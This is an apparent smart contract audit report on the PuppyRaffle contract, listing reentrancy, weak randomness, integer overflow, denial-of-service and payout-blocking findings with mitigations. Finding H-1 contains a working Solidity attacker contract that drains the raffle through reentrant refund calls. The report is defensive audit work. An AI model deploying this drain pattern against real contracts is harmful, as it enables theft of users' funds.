# Protocol Summary
Puppy Rafle is a protocol dedicated to raffling off puppy NFTs with variying rarities. A portion of entrance fees go to the winner, and a fee is taken by another address decided by the protocol owner.

# Roles
Owner: The only one who can change the feeAddress, denominated by the _owner variable.
Fee User: The user who takes a cut of raffle entrance fees. Denominated by the feeAddress variable.
Raffle Entrant: Anyone who enters the raffle. Denominated by being in the `players` array.

# Executive Summary

Issues found

|Severity | Number of issues found|
|---|---|
|High|	3|
|Medium|	2|
|Info|	0|
|Total|	5|


# Findings

## High

### [H-1] `PuppyRaffle::refund` External function call before updating state, leaving room for a reentrancy attack.

**Description:** The refund function in the PuppyRaffle contract allows an attacker to exploit a reentrancy vulnerability. The external call to transfer funds (via refund()) is made before updating the contract's state, enabling an attacker to repeatedly call the refund function through a fallback mechanism, thereby draining the contract's balance.

**Impact:** High 

**Proof of Concept:**

If the starting balance of the attacker contract is 0 ETH and the starting contract balance is 4 ETH, after an attack by the ReentrencyAttacker contract, as seen below, the contract balance will be drained to zero:

- Ending attacker contract balance: 5 ETH
- Ending contract balance: 0 ETH

<details>
Please include the code below in the PuppyRaffle.t.sol
<summary>Proof of code</summary>

```javascript
contract ReentrencyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```
</details>


**Recommended Mitigation:**

- Use Reentrancy Guard: Consider implementing the ReentrancyGuard pattern to prevent multiple calls to the same function during the execution process.

- Checks-Effects-Interactions Pattern: Always follow the best practice of the checks-effects-interactions pattern, which involves checking conditions, updating state, and interacting with external contracts only after the state has been updated.


## [H-2] Weak/Insecure Randomness in `PuppyRaffle::selectWinner` allows user to incluence or predict raffle  and/or winning puppy. 

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` produces random numbers and for the case of this raffle, it is considered Not Good.

*Note:* This means users can front-run this function and call ``refund` if they see they are not the winner 

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. This will make the entire raffle worthlesss if it becomes a gas war as to who win the raffle.

**Proof of Concept:**
1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use to predict when/how to participate. 
2. Users can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner address.
3. Users can revert their `selectWinner` transaction if they don't like the winner ir resulting puppy.

**Recommended Mitigation:**

Consider using a cryptographically provable random number generator, i.e., Chainlink VRF.


        //@audit arithemethic overflow. Fixes includes, newer version of Solidity, bigger uints(s).


### [H-3] Interger overflow of `PuppyRaffle::totalFees` looses fees.

**Description:** Solidity version prior to `0.8.0` integers were subject to interger overflow.

```javascript
uint64 myVar = type(uint64).max

// myVar = 18446744073709551615
myVar = myVar + 1

// myVar will be zero
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `address` to collect in the `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees. This will cause a lot of fees to be stuck in the contract.

**Proof of Concept:**
1. We conclude a raffle of 4 players.
2. We then got 89 players to enter the new raffle.
3. `totalFees` + uint64(fees); will overflow.
4. You will not be able to withdraw due to the line in the `withdrawfees` function. Except in the case where a selfdestruct is initiated.

<details>
<summary>Code</summary>
</details>

**Recommended Mitigation:**
1. Use a newer version of solidity `(0.8.18)`.
2. Use uint256 instead of uint64 for the `totalFees`.
3. Tou could also use the `safeMath` library of Openzeppelin.
4. Remove the balance check from `PuppyRaffle::withdrawfees`

```diff
-        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

// there are more attack vector with that final require, so we recommend removing it.
```

## Medium

### [M-1] Looping through players' array to check for duplicates in `PuppyRaffle::enterRaffle` is a Potential DOS attack. (Root Cause + Impact)

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, gas cost accumulates exponentially when new players make new checks. Every additional address in the `players` array is an additional check the loop will have to make.

**Impact:** The gas cost for Raffle rntrsnt will greately increase as more player enters the raffle. This will discourage later users from entering and causing a rush at the start of the raffle. 

An attacker might make the `PuppyRaffle::entrants` array to be so big, that no one else enters, saving the win stakes for themselves.

**Proof of Concept:**

If we have two sets of 100 players enter, the cost of gas will be such:

- thegas cost of the first 100 players: 6252128
- the gas cost of the Second 100 players: 18068218

this is more than 3X more expensive for the 2nd 100 players.

<details>
<summary>Proof of code</summary>

Include the following test into `PuppyRaffleTest.t.sol`

```javascript
 function testDosForEnterRaffleFunction () public {

        vm.txGasPrice(1);

        // Let's enter 100 players
        uint256 playerNum = 100;
        address [] memory players = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++){
            players[i] = address(i);
        }
        
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(players);
        uint256 gasEnd = gasleft();


        uint256 gasUsedFirst = (gasStart - gasEnd)*tx.gasprice;
        console.log("gas cost of the first 100 players:", gasUsedFirst);


        // for the 2nd 100 players

      address [] memory playersTwo = new address[](playerNum);
        for (uint256 i = 0; i < playerNum; i++){
            playersTwo[i] = address(i + playerNum); // address 101, 102, 103...
        }
        
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee*players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();


        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond)*tx.gasprice;
        console.log("gas cost of the Second 100 players:", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);


    }
```
</details>

**Recommended Mitigation:** Recommendations include;
- Consider allowing duplicates. Here, users can create unique wallets and enter the raffle multiple times.

- Consider using mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.  


### [M-2] Smart Contract wallet raffle winners without a receive or a fallback will block the start of a new contest.


**Description:** The PuppyRaffle::selectWinner function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery will not be able to restart.

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The PuppyRaffle::selectWinner function could revert many times and make it very difficult to reset the lottery, preventing a new one from starting.

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:**

1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The selectWinner function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

Do not allow smart contract wallet entrants (not recommended)
Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owners on the winner to claim their prize. (Recommended)
